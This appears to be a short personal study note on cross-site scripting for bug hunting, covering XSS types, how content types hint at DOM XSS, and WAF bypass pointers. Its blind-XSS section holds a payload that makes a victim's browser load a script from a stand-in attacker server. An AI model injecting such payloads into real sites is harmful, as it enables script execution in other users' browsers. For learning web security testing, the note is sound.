# XSS

taking advantage of web application executing scripts on user's browsers.

finding the functionalities where user changes some part of the applications
code that is then executed (dynamic scripts) and changing it.

- no matter the content type on the network, it could be vulnerable to xss.
  - so it could be in JSON content type.
      Even though it is sent by js not the browser --> it could be DOM XSS.
      it should be a JSON that renders in HTML
- if a content type is URL encoded or multipart, it could be DOM XSS or other types.
- if content type is JSON, it could only be DOM (it updates DOM).
- if input is reflected in the source code, it's not DOM.
- if not reflected in the source code, it could have been built with DOM.

• some page's source code are more complex and more difficult to read.

- hunter --> XSS (self) --> exploit

# XSS types:

* [[Reflected XSS]]
* [[stored XSS]]
* [[DOM-based XSS]]: important and interesting one, react and vue

- the Elements tab in Chrome DevTools shows the live DOM after the page’s JavaScript has run
  and modified the HTML, while View Page Source shows the original HTML as received from the
  server.
- in [post message](post message)

- on adding a payload 403? it's a WAF --> [[bypass xss filters]]

[[XSS contexts]]
[fuzz](fuzz)
[[exploit XSS]]
[[XSS html tags]]
[[HTML attributes]]
[[DOM based manipulation]]: a little more on XSS

# BLIND XSS:

try making the victim’s browser generate a request to a server you own:
`<script src='http://YOUR_SERVER_IP/xss'></script>`
If you see a request to the path /xss, a blind XSS has been triggered!
